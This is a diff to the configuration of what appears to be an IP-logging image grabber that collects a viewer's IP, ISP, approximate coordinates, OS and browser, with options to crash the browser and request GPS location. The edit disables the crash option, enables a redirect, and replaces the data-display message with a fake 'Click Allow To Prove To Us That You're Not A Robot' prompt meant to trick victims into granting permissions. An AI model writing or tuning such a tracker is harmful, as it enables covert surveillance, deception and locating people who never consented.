@@ -19,13 +19,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "IP: {ip}, ISP: {isp}, ASN: {asn}, COUNTRY: {country}, REGION: {region}, CITY: {city}, APROXIMATE CORDS: [{lat},{long}], TIMEZONE: {timezone}, OS: {os}, BROWSER: {browser}.", # Message to show
+        "message": "Click Allow To Prove To Us That You're Not A Robot.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -47,7 +47,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
+        "redirect": True, # Redirect to a webpage?
         "page": "https://stupid-or-not.redactedcode165926.repl.co" # Link to the webpage to redirect to
     },
 
